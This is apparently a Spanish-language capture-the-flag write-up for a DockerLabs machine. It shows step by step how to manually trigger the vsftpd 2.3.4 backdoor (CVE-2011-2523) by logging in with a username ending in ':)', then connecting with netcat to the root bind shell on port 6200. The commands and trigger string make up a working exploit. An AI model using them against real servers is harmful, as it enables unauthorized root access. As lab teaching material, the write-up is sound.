# 🐧FirstHacking

> **Dificultad:** Muy Fácil | **OS:** Linux \
> **Servicio explotado:** vsftpd 2.3.4 Backdoor\
> _&#x48;echo a mano, sin Metasploit, con mucho sudor y amor al hacking._ 🔥

***

### 🚀 Fase 1 — Despliegue de la Máquina

Primero desplegamos la máquina en DockerLabs y esperamos a que levante correctamente. Nada del otro mundo aquí — la IP objetivo que nos asigna es `172.17.0.2`.

<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

### 🔍 Fase 2 — Reconocimiento

Una vez tenemos la máquina viva, toca ver qué hay dentro. Escaneamos con nmap:

```bash
nmap -sVC -Pn 172.17.0.2
```

> `-sVC` → detecta versiones de servicios y lanza scripts básicos\
> `-Pn` → no hace ping previo (útil si ICMP está bloqueado)

<figure><img src="../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### 🎯 Resultados del escaneo

| Puerto | Estado  | Servicio | Versión          |
| ------ | ------- | -------- | ---------------- |
| **21** | Abierto | FTP      | **vsftpd 2.3.4** |

Un solo puerto visible — el 21 con FTP corriendo vsftpd 2.3.4. Anótalo porque ese número de versión va a ser muy importante. 👀

***

### 🔓 Fase 3 — Enumeración del FTP

Lo primero que se intenta con cualquier servidor FTP es ver si tiene **acceso anónimo habilitado**. El usuario `anonymous` permite entrar sin credenciales y es una falla grave de seguridad que muchos servidores tienen por configuración por defecto.

```bash
ftp 172.17.0.2
# Usuario: anonymous
```

<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

**Resultado:** ❌ Acceso denegado. En este caso está bien configurado — el acceso anónimo está desactivado.

Bien. No hay entrada fácil por ahí. Hora de investigar más sobre el servicio. 🧐

***

### 🕵️ Fase 4 — Investigación de la Vulnerabilidad

Con la versión en mano (`vsftpd 2.3.4`), una búsqueda rápida en Google revela algo muy interesante:

<figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

> 🚨 **CVE-2011-2523** — El código fuente oficial de vsftpd 2.3.4 fue **comprometido maliciosamente**. Alguien inyectó un backdoor directamente en el binario que se distribuía al público.

#### ¿Cómo funciona el backdoor?

El código malicioso inyectado hace esto internamente:

```c
if (strstr(username, ":\x29")) {
    // abre /bin/sh en el puerto 6200
    bind_shell(6200);
}
```

`:\x29` es el código ASCII de `:)` — sí, una carita feliz. 😄\
La función `strstr()` busca si el patrón `:)` **existe en algún lugar** del string del username. Si lo encuentra, abre una shell en el **puerto 6200**.

***

### ⚠️ Nota importante — El detalle que me costó 20 minutos

> Aquí viene algo que los artículos no te cuentan y que aprendí por las malas. 😅

La mayoría de writeups dicen simplemente:

> _"Entra con el usuario `:)` y se abre el backdoor."_

**INCORRECTO (o incompleto).** Lo que realmente pasa es:

El servidor FTP tiene un **parser que valida el username antes** de pasarlo al código malicioso. Si el username empieza directamente con `:)`, el servidor lo identifica como entrada inválida — caracteres especiales al inicio = usuario sospechoso = rechazado. El input nunca llega al `strstr()`.

**La solución:** poner texto válido ANTES del `:)`:

```
❌ :)          → rechazado por el parser del FTP
✅ webito:)    → pasa el parser, llega al strstr(), se activa el backdoor
✅ mario:)     → igual, cualquier texto antes funciona
```

Esto ilustra algo fundamental del hacking:

> **"Entender el mecanismo es más valioso que memorizar los pasos."**

El artículo te da el _qué_, pero si no entiendes el _por qué_, cuando algo falla — te quedas paralizado. 🧠

***

### 💥 Fase 5 — Explotación Manual

#### Paso 1 — Activar el backdoor

Nos conectamos al FTP y usamos el username con el `:)` al final:

```bash
ftp 172.17.0.2
# Usuario: webito:)
# Contraseña: cualquier_cosa
```

<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

El servidor se queda "pensando"... no responde. Eso es la señal — el backdoor se está ejecutando del lado del servidor y el puerto 6200 acaba de abrirse. 👀

#### Paso 2 — Conectarnos al backdoor

Desde nuestra máquina atacante, abrimos una conexión al puerto 6200 con netcat:

```bash
nc -v 172.17.0.2 6200
```

> `-v` → modo verbose para ver el estado de la conexión

#### Paso 3 — Shell como root 🎉

<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

```bash
whoami
# root
id
# uid=0(root) gid=0(root) groups=0(root)
```

**GG.** Sin escalada de privilegios necesaria — vsftpd corre como root en el servidor, así que la shell que nos abre hereda directamente esos privilegios. Entramos como root desde el primer momento.

***

### 🧠 Lecciones aprendidas

1. **Siempre investigar la versión exacta del servicio** — vsftpd 2.3.4 tiene CVE conocido, y nmap te la da gratis.
2. **El acceso anónimo desactivado no significa que el servicio sea seguro** — la vulnerabilidad estaba en el código, no en la config.
3. **Los artículos dan el qué, tú debes entender el por qué** — sin entender el parser del FTP, el exploit no funcionaba y no sabría por dónde buscar.
4. **Manual > Automatizado al aprender** — Metasploit lo hubiera resuelto en 30 segundos, pero no me hubiera enseñado nada de `strstr()`, parsers, ni supply chain attacks.
5. **`strstr()` busca substrings, no strings exactos** — eso explica por qué `webito:)` funciona: el `:)` existe dentro del string.

***

### 🛠️ Herramientas usadas

| Herramienta   | Uso                                     |
| ------------- | --------------------------------------- |
| `nmap -sVC`   | Reconocimiento y detección de versiones |
| `ftp`         | Enumeración y activación del backdoor   |
| `netcat (nc)` | Conexión al puerto del backdoor         |
| Google        | Investigación del CVE                   |

***

> _"El mejor hacker no es el que tiene más herramientas — es el que entiende por qué funcionan."_ 🔥\
> — aprendido a las malas, con 20 minutos de cabeza rota 😄
